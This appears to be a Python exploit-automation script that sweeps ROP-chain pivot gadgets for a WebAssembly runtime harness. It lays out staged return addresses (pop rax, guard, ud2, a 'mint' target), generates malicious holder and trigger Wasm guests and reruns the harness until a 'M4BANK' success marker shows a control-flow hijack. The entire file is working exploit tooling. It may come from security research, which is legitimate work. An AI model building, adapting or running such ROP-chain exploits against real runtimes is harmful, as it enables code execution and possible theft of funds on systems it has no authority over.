#!/usr/bin/env python3
"""sweep.py — pick a native ROP-chain shape, generate guests, run the harness.

Given the derived gadgets + runtime addresses for a specific harness binary, enumerate
usable pivot shapes (mirroring the verified PoC's `add rsp,0x150; pop rbp; ret`),
regenerate the holder/trigger/benign guests for each, run the harness a bounded number
of times, and report the achieved M4BANK rate. Stops at the first shape that lands.

Read-only local harness work; no chain interaction.
"""
import argparse, json, os, re, subprocess, sys

ap = argparse.ArgumentParser()
ap.add_argument('--gadgets', required=True)
ap.add_argument('--g0', required=True)
ap.add_argument('--cgocb', required=True)
ap.add_argument('--ud2', required=True)
ap.add_argument('--mint', required=True)
ap.add_argument('--harness', required=True)
ap.add_argument('--gen', required=True)
ap.add_argument('--wat2wasm', required=True)
ap.add_argument('--workdir', required=True)
ap.add_argument('--attempts', type=int, default=4)
ap.add_argument('--max-shapes', type=int, default=8)
ap.add_argument('--staged', type=int, default=10)
ap.add_argument('--timeout', type=int, default=60)
ap.add_argument('--offset', type=int, default=278)
ap.add_argument('--iters', type=int, default=66283)
ap.add_argument('--pre-call-drops', type=int, default=15)
ap.add_argument('--frame32', type=int, default=2)
# optional explicit gadget overrides (e.g. the harness C gadget farm)
ap.add_argument('--pivot', default='')
ap.add_argument('--poprax', default='')
ap.add_argument('--guard', default='')
ap.add_argument('--out', required=True)
a = ap.parse_args()

G = json.load(open(a.gadgets))
STAGED = a.staged


def pick_poprax():
    return G['pop_rax'][0][0] if G['pop_rax'] else None


def pick_guard():
    for want in (15, 0):
        for addr, text, xn, reg in G['guard_movups']:
            if xn == want and reg == 'ax':
                return addr, text, 'xmm%d' % xn
    for addr, text, xn, reg in G['guard_movups']:
        if reg == 'ax':
            return addr, text, 'xmm%d' % xn
    if G['guard_movq0']:
        return G['guard_movq0'][0][0], G['guard_movq0'][0][1], 'movq0'
    return None, None, None


POPRAX = pick_poprax()
GUARD, GUARD_TEXT, GUARD_XMM = pick_guard()
UD2 = int(a.ud2, 16)
MINT = int(a.mint, 16)
CGOCB = int(a.cgocb, 16)
G0 = int(a.g0, 16)

# explicit override (harness C gadget farm): pivot/poprax/guard given directly
OVERRIDE = bool(a.pivot)
if OVERRIDE:
    POPRAX = int(a.poprax, 16)
    GUARD = int(a.guard, 16)
    GUARD_TEXT, GUARD_XMM = 'farm', 'xmm15-zeroed'

if (POPRAX is None or GUARD is None or not a.ud2) and not OVERRIDE:
    print(json.dumps({'error': 'missing gadget', 'poprax': POPRAX, 'guard': GUARD, 'ud2': a.ud2}))
    sys.exit(1)


def hvs(values):
    out = [0] * STAGED
    for idx, v in values:
        out[idx] = v
    return ','.join('%x' % x for x in out)


def candidates():
    if OVERRIDE:
        vals = [(9, 0), (8, POPRAX), (7, G0), (6, GUARD), (5, CGOCB), (4, UD2), (3, MINT)]
        return [dict(kind='poprbp', addr=int(a.pivot, 16), text='farm gadget_pivot',
                     skip=0x150, base_local=9, holder_values=hvs(vals))]
    c = []
    for kind, key in (('poprbp', 'pivot_add_poprbp'), ('ret', 'pivot_add_ret')):
        for addr, text, *rest in G[key]:
            m = re.search(r'add\s+\$0x([0-9a-f]+),%rsp', text)
            if not m:
                continue
            S = int(m.group(1), 16)
            if (S - 0x108) % 8:
                continue
            i = (S - 0x108) // 8
            need_last = 6 if kind == 'poprbp' else 5
            if i < need_last or i > STAGED - 1:
                continue
            if kind == 'poprbp':
                vals = [(i, 0), (i - 1, POPRAX), (i - 2, G0), (i - 3, GUARD),
                        (i - 4, CGOCB), (i - 5, UD2), (i - 6, MINT)]
            else:
                vals = [(i, POPRAX), (i - 1, G0), (i - 2, GUARD),
                        (i - 3, CGOCB), (i - 4, UD2), (i - 5, MINT)]
            c.append(dict(kind=kind, addr=addr, text=text, skip=S, base_local=i,
                          holder_values=hvs(vals)))
    # preference: poprbp first, then largest i (closest to the PoC's 0x150)
    c.sort(key=lambda x: (0 if x['kind'] == 'poprbp' else 1, -x['base_local'], x['addr']))
    # de-dup identical shapes (same skip+kind)
    seen, out = set(), []
    for x in c:
        k = (x['kind'], x['skip'])
        if k in seen:
            continue
        seen.add(k)
        out.append(x)
    return out


def gen_guests(cand, wd):
    os.makedirs(wd, exist_ok=True)
    cmd = [sys.executable, a.gen, wd,
           '--offset', str(a.offset), '--iters', str(a.iters),
           '--pre-call-drops', str(a.pre_call_drops), '--frame32', str(a.frame32),
           '--staged', str(STAGED), '--bare-holder',
           '--plants', 'gadget', '--plant-addr', '%x' % cand['addr'],
           '--holder-values', cand['holder_values']]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        return False, r.stdout + r.stderr
    for g in ('holder', 'trigger', 'benign'):
        rr = subprocess.run([a.wat2wasm, os.path.join(wd, g + '.wat'),
                             os.path.join(wd, g + '.wasm')], capture_output=True, text=True)
        if rr.returncode != 0:
            return False, rr.stdout + rr.stderr
    return True, ''


def run_shape(cand, wd, n):
    ok, msg = gen_guests(cand, wd)
    if not ok:
        return dict(error='gen failed: ' + msg[-400:])
    hits, exits = 0, []
    for i in range(1, n + 1):
        out = os.path.join(wd, 'run-%d.json' % i)
        cmd = [a.harness, '-wasm', os.path.join(wd, 'holder.wasm'),
               '-trigger', os.path.join(wd, 'trigger.wasm'),
               '-benign', os.path.join(wd, 'benign.wasm'),
               '-warmups', '3', '-exec', '{}', '-gas', '10000000000000',
               '-tracenested', '-scandb-after', '132', '-out', out]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=a.timeout)
            rc = r.returncode
            err = r.stderr
        except subprocess.TimeoutExpired as e:
            rc = 'timeout'
            err = (e.stderr or b'').decode('utf-8', 'replace') if isinstance(e.stderr, bytes) else (e.stderr or '')
        if 'M4BANK' in err:
            hits += 1
        exits.append(rc)
        with open(os.path.join(wd, 'run-%d.stderr' % i), 'w') as f:
            f.write(err)
    return dict(hits=hits, attempts=n, exits=exits)


def main():
    cands = candidates()
    print('[sweep] %d candidate shapes; poprax=%x guard=%x(%s) g0=%x cgocb=%x ud2=%x mint=%x'
          % (len(cands), POPRAX, GUARD, GUARD_XMM, G0, CGOCB, UD2, MINT))
    summary = dict(poprax='%x' % POPRAX, guard='%x' % GUARD, guard_text=GUARD_TEXT,
                   guard_xmm=GUARD_XMM, g0='%x' % G0, cgocb='%x' % CGOCB,
                   ud2='%x' % UD2, mint='%x' % MINT,
                   offset=a.offset, iters=a.iters, pre_call_drops=a.pre_call_drops,
                   frame32=a.frame32, staged=STAGED, tried=[], best=None)
    for k, cand in enumerate(cands[:a.max_shapes]):
        wd = os.path.join(a.workdir, 'shape-%d' % k)
        print('[sweep] shape %d: %s skip=%#x base_local=%d  %s'
              % (k, cand['kind'], cand['skip'], cand['base_local'], cand['text'][:80]))
        res = run_shape(cand, wd, a.attempts)
        entry = dict(shape=k, kind=cand['kind'], pivot='%x' % cand['addr'], skip=hex(cand['skip']),
                     base_local=cand['base_local'], holder_values=cand['holder_values'],
                     result=res)
        summary['tried'].append(entry)
        print('[sweep]   -> %s' % json.dumps(res))
        if res.get('hits', 0) > 0:
            summary['best'] = entry
            break
    json.dump(summary, open(a.out, 'w'), indent=1)
    print('[sweep] best = %s' % json.dumps(summary['best']))


if __name__ == '__main__':
    main()
